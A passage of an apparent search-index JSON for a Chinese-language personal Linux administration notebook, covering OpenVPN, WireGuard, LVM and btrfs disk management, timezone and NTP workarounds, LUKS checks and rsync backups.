\u6dfb\u52a0\u4e00\u4e2a\u7528\u6237\u540d\u4e3ausername\u7684\u7528\u6237\u5e76\u521b\u5efahome\u76ee\u5f55\uff0c\u5e76\u8bbe\u7f6e\u5bc6\u7801\u4e3abadpassword","title":"\u975e\u4ea4\u4e92\u5f0f\u6dfb\u52a0\u7528\u6237"},{"location":"Linux-setup/#openvpn","text":"\u4e00\u4e2a\u6700\u6700\u7b80\u5355\u7684\u573a\u666f\uff1a\u53ea\u6709\u4e00\u4e2a\u670d\u52a1\u5668 \u4e00\u4e2a\u5ba2\u6237\u7aef\uff0c\u5728\u5bb9\u5668\u4e2d\u7528\u6765\u7ed9\u7528\u6237\u76f4\u63a5\u8bbf\u95ee\u7684\u4e00\u4e2a\u5185\u7f51IP \u53c2\u8003\uff1a https://openvpn.net/index.php/open-source/documentation/miscellaneous/78-static-key-mini-howto.html","title":"\u7b80\u5355OpenVPN\u914d\u7f6e"},{"location":"Linux-setup/#openvpn_1","text":"Linux: apt-get install openvpn Windows: openvpn.exe","title":"\u5b89\u88c5openvpn:"},{"location":"Linux-setup/#_10","text":"openvpn --genkey --secret static.key \u7528\u53e6\u5916\u5efa\u7acb\u7684\u5b89\u5168\u901a\u9053(SSH)\u5c06static.key\u53d1\u7ed9\u5ba2\u6237\u7aef","title":"\u751f\u6210\u5bc6\u94a5"},{"location":"Linux-setup/#_11","text":"ifconfig 10 . 8 . 0 . 1 10 . 8 . 0 . 2 secret / static . key keepalive 10 60 persist - key persist - tun proto udp port 1194 dev tun0 status / tmp / openvpn - status . log user nobody group nogroup \u5728 Ubuntu \u4e2d\uff0c\u5982\u679c\u8981\u914d\u7f6e\u6210\u7cfb\u7edf\u670d\u52a1\u7684\u5f62\u5f0f\uff0c\u5c06\u5176\u4fdd\u5b58\u5230/etc/openvpn/myvpn.conf \u7136\u540e\u8fd9\u6837\u542f\u52a8\u5b83\uff1a service openvpn@myvpn start \u8fd9\u6837\u8bbe\u7f6e\u5f00\u673a\u81ea\u542f systemctl enable openvpn@myvpn.service","title":"\u670d\u52a1\u7aef\u914d\u7f6e"},{"location":"Linux-setup/#_12","text":"remote \u8fd9\u91cc\u662f\u4f60\u7684\u670d\u52a1\u5668IP \u8fd9\u91cc\u662f\u4f60\u7684\u670d\u52a1\u5668\u7aef\u53e3 udp dev tun ifconfig 10.8.0.2 10.8.0.1 secret static.key","title":"\u5ba2\u6237\u7aef\u914d\u7f6e"},{"location":"Linux-setup/#docker","text":"\u53c2\u8003\uff1a https://raw.githubusercontent.com/kylemanna/docker-openvpn/master/bin/ovpn_run \u8fd0\u884c\u5bb9\u5668\u7684\u65f6\u5019\u4e00\u5b9a\u8981\u7ed9\u53c2\u6570 --cap-add=NET_ADMIN \u53e6\u5916\u8fd8\u9700\u8981\u5728\u5bb9\u5668\u4e2d\u6267\u884c\uff1a mkdir -p /dev/net if [ ! -c /dev/net/tun ]; then mknod /dev/net/tun c 10 200 fi","title":"\u5728Docker\u4e2d\u4f7f\u7528\u670d\u52a1\u7aef"},{"location":"Linux-setup/#_13","text":"\u53c2\u8003\uff1a http://liumissyou.blog.51cto.com/4828343/1302050 \u8bbe\u7f6e\u4e3a\u4e0a\u6d77\u65f6\u533a UTC+8 apt-get install tzdata cp /etc/localtime /etc/localtime.bak ln -svf /usr/share/zoneinfo/Asia/Shanghai /etc/localtime echo \"TZ='Asia/Shanghai'\">>~/.bashrc ntpdate cn.pool.ntp.org \u4fee\u6539\u65f6\u95f4\u53ef\u4ee5\u7528\uff1a date -s \"2017-06-18 16:40:00\"","title":"\u65f6\u533a\u65f6\u95f4\u8bbe\u7f6e"},{"location":"Linux-setup/#ext4","text":"Linux\u7cfb\u7edf\u5efa\u8bae\u4f7f\u7528ext4\u5206\u533a\u683c\u5f0f\uff0c\u4f46\u76f4\u63a5mkfs.ext4 /dev/sda1\u5c31\u6709\u5f88\u5927\u7684\u5751\uff1a\u4f1a\u9ed8\u8ba4lazyinit\u5728\u5f88\u957f\u4e00\u6bb5\u65f6\u95f4\u5185\u5360\u7528IO \u53c2\u8003\uff1a http://fibrevillage.com/storage/474-ext4-lazy-init \u9002\u7528\u4e8e\u5b58\u50a8\u5c11\u91cf\u5927\u6587\u4ef6\u7684\u683c\u5f0f\u5316\u5927\u786c\u76d8\u7684\u65b9\u6cd5\u5982\u4e0b\uff0c\u8fd9\u6837\u4e0d\u4f1a\u8df3\u8fc7\u521d\u59cb\u5316\u78c1\u76d8\u7684\u8fc7\u7a0b\u800c\u4e14\u521d\u59cb\u5316\u8fc7\u7a0b\u5f88\u5feb\uff1a mkfs.ext4 /dev/sdXX -E lazy_itable_init=0,lazy_journal_init=0 -O sparse_super,large_file -m 0 -T largefile4 \u5bf9\u5e94\u7684 man\u6587\u6863","title":"\u5feb\u901f\u5730\u683c\u5f0f\u5316\u5927\u5206\u533aext4"},{"location":"Linux-setup/#ca-mitmproxy","text":"@TAG mitm cat ~/.mitmproxy/mitmproxy-ca-cert.pem >> /etc/ssl/certs/ca-certificates.crt","title":"\u6dfb\u52a0\u53d7\u4fe1\u4efb\u7684CA\u8bc1\u4e66 mitmproxy"},{"location":"Linux-setup/#inodebtrfs","text":"","title":"\u660e\u660e\u8fd8\u6709\u5927\u91cf\u7a7a\u95f4\u5374\u8bf4\u6ca1\u6709\uff1finode\u6ee1\u4e86\uff01\u6302\u8f7d\u5355\u4e2a\u6587\u4ef6\u4e3abtrfs\u5206\u533a"},{"location":"Linux-setup/#_14","text":"df -h \u663e\u793a\u8fd8\u6709\u5f88\u591a\u7a7a\u95f4\uff0c\u4f46 echo test>test.txt \u4f1a\u663e\u793a No space left on device \u67e5\u5230\u8fd9\u4e2a\uff1a https://wiki.gentoo.org/wiki/Knowledge_Base:No_space_left_on_device_while_there_is_plenty_of_space_available \u4f7f\u7528 df -i \u67e5\u770binodes\u5360\u7528\u60c5\u51b5\uff0c\u53d1\u73b0\u786e\u5b9e100%\u4e86","title":"\u95ee\u9898\u73b0\u8c61"},{"location":"Linux-setup/#_15","text":"inodes\u4e0a\u9650\u5728mkfs\u65f6\u5c31\u5b9a\u4e0b\u6765\u4e86\uff0c\u4e0d\u80fd\u6539\u52a8\uff0c\u6240\u4ee5\u6ca1\u6551\u4e86\u3002\u3002\u3002 \u771f\u6ca1\u6551\u4e86\u561b\uff1f \u5f53\u7136\u4e0d\u662f\uff0c\u867d\u7136\u4e0d\u80fd\u5199\u5165\u5927\u91cf\u5c0f\u6587\u4ef6\uff0c\u4f46\u8fd8\u662f\u53ef\u4ee5\u5199\u4e00\u4e2a\u5927\u6587\u4ef6\u7684\u561b\uff0c\u5c31\u60f3\u5230\u6302\u8f7d\u5355\u4e2a\u6587\u4ef6\u4e3abtrfs\u5206\u533a","title":"\u89e3\u51b3\u65b9\u6848"},{"location":"Linux-setup/#1-inodes","text":"\u5220\u6389\u4e00\u4e9b\u4e0d\u7528\u7684\u5c0f\u6587\u4ef6\uff0c\u4e5f\u4e0d\u7528\u5220\u592a\u591a","title":"1. \u5220\u6587\u4ef6 \u817e\u51fa\u90e8\u5206inodes"},{"location":"Linux-setup/#2-1tbsparse-file","text":"\u53c2\u8003: https://prefetch.net/blog/2009/07/05/creating-sparse-files-on-linux-hosts-with-dd/ \u4f7f\u7528dd\u547d\u4ee4\uff0c\u4e0d\u5c06\u5b9e\u9645\u5185\u5bb9\u5199\u5165\u786c\u76d8\uff0c\u80fd\u5f88\u5feb\u6267\u884c\u5b8c\u6210\uff1a NAME=\"filesystem\" dd if=/dev/zero of= ${ NAME } .img bs=1 count=0 seek=1T \u6267\u884c\u540els -alh\u80fd\u770b\u5230\u6587\u4ef6\u5927\u5c0f\u4e3a1T\uff0c\u4f7f\u7528 du filesystem.img \u67e5\u770b\u771f\u5b9e\u7a7a\u95f4","title":"2. \u521b\u5efa\u4e00\u4e2a1TB\u7684sparse file"},{"location":"Linux-setup/#3","text":"\u53c2\u8003\uff1a https://www.jamescoyle.net/how-to/2096-use-a-file-as-a-linux-block-device btrfs\u53c2\u8003\uff1a https://btrfs.wiki.kernel.org/index.php/Getting_started mkfs.btrfs ${ NAME } .img","title":"3. \u521b\u5efa\u78c1\u76d8\u5206\u533a"},{"location":"Linux-setup/#4","text":"mount ${ NAME } .img /mnt","title":"4. \u6302\u8f7d\u5206\u533a"},{"location":"Linux-setup/#5","text":"\u5c31\u7528mv\u50cf\u5f80\u5e38\u4e00\u6837\u642c\u54af","title":"5. \u7136\u540e\u5c31\u53ef\u4ee5\u642c\u8fd0\u6570\u636e\u8fc7\u53bb\u4e86"},{"location":"Linux-setup/#_16","text":"# \u67e5\u770b\u78c1\u76d8\u6587\u4ef6\u5360\u7528\u7a7a\u95f4 du -h filesystem.img # \u67e5\u770bbtrfs\u5143\u6570\u636e\u5360\u7528\u7a7a\u95f4 btrfs filesystem df /mnt # \u4e5f\u662f\u67e5\u770b\u7a7a\u95f4 btrfs filesystem usage /mnt","title":"\u4e00\u4e9b\u67e5\u770b\u7a7a\u95f4\u7684\u547d\u4ee4"},{"location":"Linux-setup/#6","text":"sudo umount /mnt sudo losetup -d /dev/loop0","title":"6. \u5378\u8f7d\u8bbe\u5907"},{"location":"Linux-setup/#btrfs","text":"@TAG \u5b89\u5168\u6700\u4f73\u5b9e\u8df5 \u968f\u7740\u4e0d\u505c\u5730\u5199\u5165\u6570\u636e\uff0c\u4e0a\u9762\u521b\u5efa\u76841TB\u5206\u533a\u5c31\u8981\u88ab\u5199\u6ee1\u4e86\uff01\u4f46\u6587\u4ef6\u6240\u5728\u7269\u7406\u78c1\u76d8\u8fd8\u6709\u7a7a\u95f4\uff0c\u6211\u4eec\u53ef\u4ee5\u8fd9\u6837\u7ed9btrfs\u78c1\u76d8\u6269\u5bb9\uff1a \u5b9e\u9645\u6587\u4ef6\u7528truncate\u589e\u52a0\u4e00\u4e2ahole\uff1blosetup\u66f4\u65b0loop0\u7684\u5927\u5c0f\uff1b\u4f7f\u7528btrfs\u547d\u4ee4\u7ed9\u5206\u533a\u6269\u5bb9 truncate\u662f\u4e00\u4e2a\u5371\u9669\u7684\u547d\u4ee4\uff0c\u4e3a\u4e86\u907f\u514d\u624b\u6296\u628a\u7a7a\u95f4\u5199\u5c0f\u4e86\u4e22\u5931\u6570\u636e\uff0c\u8fd9\u91cc\u7528 --reference \u53c2\u6570\u6307\u5b9a\u4e00\u4e2a\u76ee\u6807\u5927\u5c0f\u7684\u6587\u4ef6\uff0c\u4f8b\u5982\u6211\u4eec\u60f3\u6269\u5bb9\u52301.5T=1536GB dd if =/ dev / zero of = temp bs = 1 count = 0 seek = 1536 G ls - alh # \u786e\u8ba4\u6587\u4ef6\u5927\u5c0f truncate - r temp filesystem . img # \u5047\u8bbe\u76ee\u524d\u4f7f\u7528\u7684\u662f / dev / loop0 # \u4f60\u53ef\u4ee5\u8fd9\u6837\u786e\u8ba4 loop0\u786e\u5b9e\u662ffilesystem . img\u6302\u8f7d\u7684 \uff1a losetup --list /dev/loop0 losetup - c / dev / loop0 # \u786e\u4fdd\u76ee\u524d btrfs\u5206\u533a\u662f\u6302\u8f7d\u7740\u7684 \uff0c btrfs\u5fc5\u987b\u5148mount\u624d\u80fdresize # mount filesystem . img / mnt btrfs filesystem resize + 500 G / mnt \u53c2\u8003\uff1a https://linux.die.net/man/1/truncate https://askubuntu.com/questions/260620/resize-dev-loop0-and-increase-space https://btrfs.wiki.kernel.org/index.php/UseCases#How_do_I_resize_a_partition.3F_.28shrink.2Fgrow.29","title":"\u6269\u5bb9\u4e0a\u8ff0\u5355\u6587\u4ef6btrfs\u78c1\u76d8"},{"location":"Linux-setup/#_17","text":"\u9996\u5148\u5f53\u7136\u662f sudo umount /mnt \u5378\u8f7d\u6302\u8f7d\u70b9\u54af\uff0c\u5982\u4f55\u66f4\u5b89\u5168\u4e00\u70b9\u5462\uff1f udisksctl power-off -b /dev/sdb From: https://unix.stackexchange.com/questions/354138/safest-way-to-remove-usb-drive-on-linux","title":"\u5b89\u5168\u5730\u62d4\u51fa\u79fb\u52a8\u786c\u76d8"},{"location":"Linux-setup/#iptables-127001","text":"\u53c2\u8003\uff1a https://unix.stackexchange.com/questions/111433/iptables-redirect-outside-requests-to-127-0-0-1 \u4f8b\u5982\u6709\u76d1\u542c\u5728127.0.0.1:1234\u7684\u5e94\u7528\uff0c\u73b0\u5728\u60f3\u901a\u8fc7ip:5678\u6765\u8bbf\u95ee iptables -t nat -I PREROUTING -p tcp --dport 5678 -j DNAT --to-destination 127.0.0.1:1234 sysctl -w net.ipv4.conf.eth0.route_localnet=1","title":"iptables \u8ba9\u76d1\u542c\u5728127.0.0.1\u4e0a\u7684\u7aef\u53e3\u53ef\u4ee5\u516c\u7f51\u8bbf\u95ee"},{"location":"Linux-setup/#vmware-lvm","text":"@TAG \u865a\u62df\u673a \u53c2\u8003\uff1a https://ma.ttias.be/increase-a-vmware-disk-size-vmdk-formatted-as-linux-lvm-without-rebooting/ https://ubuntuforums.org/showthread.php?t=2277232 \u4fee\u590d GPT PMBR size mismatch \u7528 parted -l \u8f93\u5165Fix\u5373\u53ef\uff0c\u65e0\u9700live cd root @docker : / d # parted - l Warning : Not all of the space available to / dev / sda appears to be used , you can fix the GPT to use all of the space ( an extra 314572800 blocks ) or continue with the current setting ? Fix / Ignore ? Fix Model : VMware Virtual disk ( scsi ) Disk / dev / sda : 215 GB Sector size ( logical / physical ) : 512 B / 512 B Partition Table : gpt Disk Flags : Number Start End Size File system Name Flags 1 1049 kB 2097 kB 1049 kB bios_grub 2 2097 kB 1076 MB 1074 MB ext4 3 1076 MB 53.7 GB 52.6 GB Model : Linux device - mapper ( linear ) ( dm ) Disk / dev / mapper / ubuntu -- vg - ubuntu -- lv : 52.6 GB Sector size ( logical / physical ) : 512 B / 512 B Partition Table : loop Disk Flags : Number Start End Size File system Flags 1 0.00 B 52.6 GB 52.6 GB ext4 Warning : Unable to open / dev / sr0 read - write ( Read - only file system ). / dev / sr0 has been opened read - only . Model : NECVMWar VMware SATA CD00 ( scsi ) Disk / dev / sr0 : 875 MB Sector size ( logical / physical ) : 2048 B / 2048 B Partition Table : mac Disk Flags : Number Start End Size File system Name Flags 1 2048 B 6143 B 4096 B Apple 2 659 MB 662 MB 2523 kB EFI root @docker : / d # fdisk - l Disk / dev / loop0 : 91 MiB , 95408128 bytes , 186344 sectors Units : sectors of 1 * 512 = 512 bytes Sector size ( logical / physical ) : 512 bytes / 512 bytes I / O size ( minimum / optimal ) : 512 bytes / 512 bytes Disk / dev / sda : 200 GiB , 214748364800 bytes , 419430400 sectors Units : sectors of 1 * 512 = 512 bytes Sector size ( logical / physical ) : 512 bytes / 512 bytes I / O size ( minimum / optimal ) : 512 bytes / 512 bytes Disklabel type : gpt Disk identifier : C6597B3B - 17 F0 - 482 A - AF5D - 6056 F7788052 Device Start End Sectors Size Type / dev / sda1 2048 4095 2048 1 M BIOS boot / dev / sda2 4096 2101247 2097152 1 G Linux filesystem / dev / sda3 2101248 104855551 102754304 49 G Linux filesystem Disk / dev / mapper / ubuntu -- vg - ubuntu -- lv : 49 GiB , 52609155072 bytes , 102752256 sectors Units : sectors of 1 * 512 = 512 bytes Sector size ( logical / physical ) : 512 bytes / 512 bytes I / O size ( minimum / optimal ) : 512 bytes / 512 bytes root @docker : / d # fdisk / dev / sda Welcome to fdisk ( util - linux 2.31.1 ). Changes will remain in memory only , until you decide to write them . Be careful before using the write command . Command ( m for help ) : n Partition number ( 4 - 128 , default 4 ) : First sector ( 104855552 - 419430366 , default 104855552 ) : Last sector , + sectors or + size { K , M , G , T , P } ( 104855552 - 419430366 , default 419430366 ) : Created a new partition 4 of type 'Linux filesystem' and of size 150 GiB . Command ( m for help ) : t Partition number ( 1 - 4 , default 4 ) : 4 Partition type ( type L to list all types ) : 8 e Type of partition 4 is unchanged : Linux filesystem . Command ( m for help ) : w The partition table has been altered . Syncing disks . root @docker : / d # partprobe - s / dev / sda : gpt partitions 1 2 3 4 / dev / mapper / ubuntu -- vg - ubuntu -- lv : loop partitions 1 Warning : Unable to open / dev / sr0 read - write ( Read - only file system ). / dev / sr0 has been opened read - only . Warning : Unable to open / dev / sr0 read - write ( Read - only file system ). / dev / sr0 has been opened read - only . Warning : Unable to open / dev / sr0 read - write ( Read - only file system ). / dev / sr0 has been opened read - only . / dev / sr0 : mac partitions 1 2 root @docker : / d # fdisk - l Disk / dev / loop0 : 91 MiB , 95408128 bytes , 186344 sectors Units : sectors of 1 * 512 = 512 bytes Sector size ( logical / physical ) : 512 bytes / 512 bytes I / O size ( minimum / optimal ) : 512 bytes / 512 bytes Disk / dev / sda : 200 GiB , 214748364800 bytes , 419430400 sectors Units : sectors of 1 * 512 = 512 bytes Sector size ( logical / physical ) : 512 bytes / 512 bytes I / O size ( minimum / optimal ) : 512 bytes / 512 bytes Disklabel type : gpt Disk identifier : C6597B3B - 17 F0 - 482 A - AF5D - 6056 F7788052 Device Start End Sectors Size Type / dev / sda1 2048 4095 2048 1 M BIOS boot / dev / sda2 4096 2101247 2097152 1 G Linux filesystem / dev / sda3 2101248 104855551 102754304 49 G Linux filesystem / dev / sda4 104855552 419430366 314574815 150 G Linux filesystem Disk / dev / mapper / ubuntu -- vg - ubuntu -- lv : 49 GiB , 52609155072 bytes , 102752256 sectors Units : sectors of 1 * 512 = 512 bytes Sector size ( logical / physical ) : 512 bytes / 512 bytes I / O size ( minimum / optimal ) : 512 bytes / 512 bytes root @docker : / d # pvcreate / dev / sda sda sda1 sda2 sda3 sda4 root @docker : / d # pvcreate / dev / sda4 Physical volume \"/dev/sda4\" successfully created . root @docker : / d # vgdisplay --- Volume group --- VG Name ubuntu - vg System ID Format lvm2 Metadata Areas 1 Metadata Sequence No 3 VG Access read / write VG Status resizable MAX LV 0 Cur LV 1 Open LV 1 Max PV 0 Cur PV 1 Act PV 1 VG Size < 49.00 GiB PE Size 4.00 MiB Total PE 12543 Alloc PE / Size 12543 / < 49.00 GiB Free PE / Size 0 / 0 VG UUID FJI08W - C0Db - dXmu - WPyq - Zlr9 - Lejq - xadlCk root @docker : / d # vgextend ubuntu - vg / dev / sda4 Volume group \"ubuntu-vg\" successfully extended root @docker : / d # pvscan PV / dev / sda3 VG ubuntu - vg lvm2 [ <49.00 GiB / 0 free ] PV / dev / sda4 VG ubuntu - vg lvm2 [ <150.00 GiB / <150.00 GiB free ] Total : 2 [ 198.99 GiB ] / in use : 2 [ 198.99 GiB ] / in no VG : 0 [ 0 ] root @docker : / d # lvextend / dev / ubuntu - vg / ubuntu - lv / dev / sda4 Size of logical volume ubuntu - vg / ubuntu - lv changed from < 49.00 GiB ( 12543 extents ) to 198.99 GiB ( 50942 extents ). Logical volume ubuntu - vg / ubuntu - lv successfully resized . root @docker : / d # resize2fs / dev / ubuntu - vg / ubuntu - lv resize2fs 1.44.1 ( 24 - Mar - 2018 ) Filesystem at / dev / ubuntu - vg / ubuntu - lv is mounted on / ; on - line resizing required old_desc_blocks = 7 , new_desc_blocks = 25 The filesystem on / dev / ubuntu - vg / ubuntu - lv is now 52164608 ( 4 k ) blocks long .","title":"VMWare\u6269\u5bb9\u78c1\u76d8 LVM\u5728\u7ebf\u6269\u5bb9"},{"location":"Linux-setup/#vmware","text":"@TAG \u865a\u62df\u673a \u53c2\u8003\u8fd9\u4e24\u7bc7\uff1a https://www.cyberciti.biz/tips/vmware-add-a-new-hard-disk-without-rebooting-guest.html https://www.unixmen.com/add-a-new-disk-to-lvm/ root@docker3:/d# for i in /sys/class/scsi_host/*; do echo \"- - -\" > ${ i } /scan; done root@docker3:/d# fdisk -l Disk /dev/sdb: 1 TiB, 1099511627776 bytes, 2147483648 sectors Units: sectors of 1 * 512 = 512 bytes Sector size (logical/physical): 512 bytes / 512 bytes I/O size (minimum/optimal): 512 bytes / 512 bytes root@docker3:/d# fdisk /dev/sdb Welcome to fdisk (util-linux 2.31.1). Changes will remain in memory only, until you decide to write them. Be careful before using the write command. Device does not contain a recognized partition table. Created a new DOS disklabel with disk identifier 0x3289a390. Command (m for help): n Partition type p primary (0 primary, 0 extended, 4 free) e extended (container for logical partitions) Select (default p): Using default response p. Partition number (1-4, default 1): First sector (2048-2147483647, default 2048): Last sector, +sectors or +size{K,M,G,T,P} (2048-2147483647, default 2147483647): Created a new partition 1 of type 'Linux' and of size 1024 GiB. Command (m for help): t Selected partition 1 Hex code (type L to list all codes): 8e Changed type of partition 'Linux' to 'Linux LVM'. Command (m for help): w The partition table has been altered. Calling ioctl() to re-read partition table. Syncing disks. root@docker3:/d# pvcreate /dev/sdb1 Physical volume \"/dev/sdb1\" successfully created. root@docker3:/d# vgextend ubuntu-vg /dev/sdb1 Volume group \"ubuntu-vg\" successfully extended root@docker3:/d# pvscan PV /dev/sda3 VG ubuntu-vg lvm2 [ <199.00 GiB / 0 free] PV /dev/sdb1 VG ubuntu-vg lvm2 [<1024.00 GiB / <1024.00 GiB free] Total: 2 [1.19 TiB] / in use: 2 [1.19 TiB] / in no VG: 0 [0 ] root@docker3:/d# lvextend -l +100%FREE /dev/ubuntu-vg/ubuntu-lv Size of logical volume ubuntu-vg/ubuntu-lv changed from <199.00 GiB (50943 extents) to 1.19 TiB (313086 extents). Logical volume ubuntu-vg/ubuntu-lv successfully resized. root@docker3:/d# resize2fs /dev/ubuntu-vg/ubuntu-lv resize2fs 1.44.1 (24-Mar-2018) Filesystem at /dev/ubuntu-vg/ubuntu-lv is mounted on /; on-line resizing required old_desc_blocks = 25, new_desc_blocks = 153 The filesystem on /dev/ubuntu-vg/ubuntu-lv is now 320600064 (4k) blocks long. root@docker3:/d# df -h /dev/mapper/ubuntu--vg-ubuntu--lv 1.2T 170G 986G 15% /","title":"VMWare\u65b0\u6dfb\u52a0\u4e00\u5757\u786c\u76d8\u6269\u5bb9\u6839\u76ee\u5f55"},{"location":"Linux-setup/#vmdklvm","text":"@TAG \u865a\u62df\u673a \u79bb\u7ebf\u64cd\u4f5c \u53c2\u8003\uff1a https://superuser.com/questions/1376690/how-to-mount-an-lvm-volume-from-a-dd-raw-vmdk-image \u8bd5\u8fc7\u7528windows\u76847z\u76f4\u63a5\u6253\u5f00\u538b\u7f29\u5305\uff0c\u53ea\u80fd\u770b\u5230LVM\u6216\u8005\u591a\u4e2aimg\u6587\u4ef6\uff0c\u4e0d\u80fd\u8df3\u8fc7\u89e3\u538b\u6b65\u9aa4\uff0c\u6240\u4ee5\u8fd8\u662f\u5728linux\u4e0a\u6302\u8f7d\u5427 \u5047\u8bbe\u6709\u4e09\u4e2avmdk\u6587\u4ef6\u9700\u8981\u6302\u8f7d\uff0c\u5f97\u5230\u7684lvm\u662f /dev/ubuntu-vg/ubuntu-lv \uff0c\u53ea\u8bfb\u6302\u8f7d\u5230 /mnt \u9700\u8981 apt install -y kpartx \u6302\u8f7d mount.sh: 1 2 3 4 5 6 7 #!/bin/bash kpartx -a -v disk1.vmdk kpartx -a -v disk2.vmdk kpartx -a -v disk3.vmdk sleep 2 pvscan mount -o ro /dev/ubuntu-vg/ubuntu-lv /mnt \u53d6\u6d88\u6302\u8f7d umount.sh: 1 2 3 4 5 6 7 #!/bin/bash umount /mnt lvchange -an /dev/ubuntu-vg/ubuntu-lv vgchange -an /dev/ubuntu-vg kpartx -d disk1.vmdk kpartx -d disk2.vmdk kpartx -d disk3.vmdk","title":"\u6302\u8f7d\u591a\u4e2avmdk\u4e2d\u7684LVM\u5206\u533a"},{"location":"Linux-setup/#rclocal","text":"\u53c2\u8003 https://www.linuxbabe.com/linux-server/how-to-enable-etcrc-local-with-systemd \u786e\u8ba4\u6709\u6ca1\u6709\u542f\u7528rc.local: systemctl status rc-local.service \u5982\u679c\u6709\u7eff\u8272\u7684 Active: active (exited) \u51fa\u73b0\u5c31\u662f\u5df2\u7ecf\u542f\u7528 nano /etc/systemd/system/rc-local.service printf '%s\\n' '#!/bin/bash' 'exit 0' | sudo tee -a /etc/rc.local chmod +x /etc/rc.local systemctl enable rc-local [Unit] Description = /etc/rc.local Compatibility ConditionPathExists=/etc/rc.local [Service] Type = forking ExecStart=/etc/rc.local start TimeoutSec=0 StandardOutput=tty RemainAfterExit=yes SysVStartPriority=99 [Install] WantedBy = multi-user.target","title":"\u542f\u7528rc.local"},{"location":"Linux-setup/#apttranslation","text":"apt update\u7684\u65f6\u5019\u53d1\u73b0\u4e00\u5806\u7ffb\u8bd1\u7684\u6761\u76ee\uff0c\u4e0d\u60f3\u770b\u5230\u8fd9\u4e9b \u521b\u5efa/etc/apt/apt.conf.d/99translations Acquire::Languages \"none\";","title":"apt\u7981\u7528Translation"},{"location":"Linux-setup/#wireguard","text":"systemctl enable wg - quick @ wg0 . service systemctl daemon - reload service wg - quick @ wg0 start service wg - quick @ wg0 status","title":"\u5f00\u673a\u81ea\u542f\u52a8wireguard"},{"location":"Linux-setup/#do-release-upgrade","text":"\u53c2\u8003\uff1a https://www.kingsware.de/2019/01/05/repair-a-damaged-package-system-after-ubuntu-dist-upgrade/ \u53ef\u80fd\u7684\u539f\u56e0\u662f\u4f7f\u7528\u4e86ppa\u6e90\uff0c\u800c\u65b0\u7684\u53d1\u884c\u7248\u91cc\u8fd9\u4e9b\u8f6f\u4ef6\u5305\u5df2\u7ecf\u8fdb\u5165\u5b98\u65b9\u6e90\u9020\u6210\u51b2\u7a81 apt update apt upgrade apt dist-upgrade apt install -f dpkg --configure -a apt autoremove \u5982\u679c\u4f60\u9700\u8981\u7981\u7528ppa\u6e90\uff0c\u4f60\u53ef\u4ee5\u76f4\u63a5\u53bb\u5220\u9664 /etc/apt/sources.list.d \u7684\u6587\u4ef6\uff0c\u6216\u8005\uff1a add-apt-repository --remove ppa:PPA_REPOSITORY_NAME/PPA-NAME","title":"\u4fee\u590d\u5931\u8d25\u7684do-release-upgrade"},{"location":"Linux-setup/#wireguard_1","text":"\u62a5\u9519\u4fe1\u606f error: \u2018const struct ipv6_stub\u2019 has no member named \u2018ipv6_dst_lookup_flow\u2019 \u67e5\u5230\u8fd9\u4e9b\u94fe\u63a5\uff1a https://bugs.debian.org/cgi-bin/bugreport.cgi?bug=959157 \u5b98\u65b9\u5df2\u7ecf\u7ed9\u51fa\u4e86patch\uff1a https://git.zx2c4.com/wireguard-linux-compat/commit/?id=4602590adee92557847e61c8cd14445d35fbfa2e \u4f46\u662f\u6211\u5df2\u7ecf\u4ece\u6700\u65b0git\u4e0b\u8f7d\uff0c\u8fd9\u4e2apatch\u662f\u5df2\u7ecf\u6253\u4e86\u7684\uff0c\u8fd8\u662f\u540c\u6837\u7684\u62a5\u9519 \u770bpatch\u53d1\u73b0\u8fd9\u4e2a\u6539\u52a8\u5c31\u662f\u5728\u5224\u65ad\u5185\u6838\u7248\u672c\uff0c\u5982\u679c\u7b26\u5408\u7279\u5b9a\u7248\u672c\u5c31\u5f15\u5165 ipv6_dst_lookup_flow \u7684#define\u8bed\u53e5 \u4f46\u4f30\u8ba1\u8fd9\u4e2a\u7248\u672c\u5224\u65ad\u662f\u4e0d\u5b8c\u5907\u7684\uff0c\u6b63\u597d\u6f0f\u6389\u4e86\u5f53\u524d\u7684\u5185\u6838\u7248\u672c\uff0c\u6240\u4ee5\u89e3\u51b3\u65b9\u6848\u5f88\u7b80\u5355\uff1a\u5f3a\u884c\u628a\u8fd9\u4e2adefine\u52a0\u5165\u5373\u53ef git clone https://git.zx2c4.com/wireguard-linux-compat cd wireguard-linux-compat/src echo \"#define ipv6_dst_lookup_flow(a, b, c, d) ipv6_dst_lookup(a, b, &dst, c) + (void *)0 ?: dst\" >> compat/compat.h make make install","title":"\u89e3\u51b3wireguard \u5185\u6838\u6a21\u5757\u7f16\u8bd1\u5931\u8d25"},{"location":"Linux-setup/#luks","text":"\u6559\u7a0b\uff1a https://www.cyberciti.biz/security/howto-linux-hard-disk-encryption-with-luks-cryptsetup-command/","title":"LUKS"},{"location":"Linux-setup/#_18","text":"cryptsetup luksDump \u8bbe\u5907 cryptsetup luksOpen --test-passphrase --key-slot 0 \u8bbe\u5907 && echo ok cryptsetup luksOpen --test-passphrase --key-file \u5bc6\u94a5\u6587\u4ef6 --key-slot 1 \u8bbe\u5907 && echo ok","title":"\u9a8c\u8bc1\u5bc6\u94a5\u662f\u5426\u6b63\u786e"},{"location":"Linux-setup/#ntp-http","text":"\u5728ntp\u670d\u52a1\u5668\u8bbf\u95ee\u4e0d\u4e86\u7684\u65f6\u5019\uff0c\u6211\u4eec\u4e5f\u53ef\u4ee5\u4f7f\u7528http\u534f\u8bae\u7684Date\u5b57\u6bb5\u6765\u83b7\u53d6\u65f6\u95f4 \u53c2\u8003\uff1a https://superuser.com/questions/307158/how-to-use-ntpdate-behind-a-proxy 1 2 #!/bin/bash date -s \" $( curl -i \"http://www.google.com/\" 2 >/dev/null | grep -E '^[[:space:]]*[dD]ate:' | sed 's/^[[:space:]]*[dD]ate:[[:space:]]*//' | head -1l | awk '{print $1, $3, $2, $5 ,\"GMT\", $4 }' | sed 's/,//' ) \"","title":"ntp\u7684\u66ff\u4ee3 \u4f7f\u7528http\u66f4\u65b0\u65f6\u95f4"},{"location":"Linux-setup/#rsync","text":"\u53c2\u8003\uff1a \u4e3b\u8981\u53c2\u6570\u6765\u81ea https://github.com/laurent22/rsync-time-backup https://ostechnix.com/backup-entire-linux-system-using-rsync/ \u4e0d\u8981\u8de8\u8fc7mount\u8fb9\u754c\u7528 -xx https://superuser.com/questions/626141/rsync-recursive-on-same-mount-only \u663e\u793a\u8fdb\u5ea6\u7528 --info=progress2 https://www.cyberciti.biz/faq/show-progress-during-file-transfer/ rsync --info=progress2 -D --numeric-ids --links --hard-links --itemize-changes --times --recursive --perms --owner --group --stats --human-readable -xx / /target/ 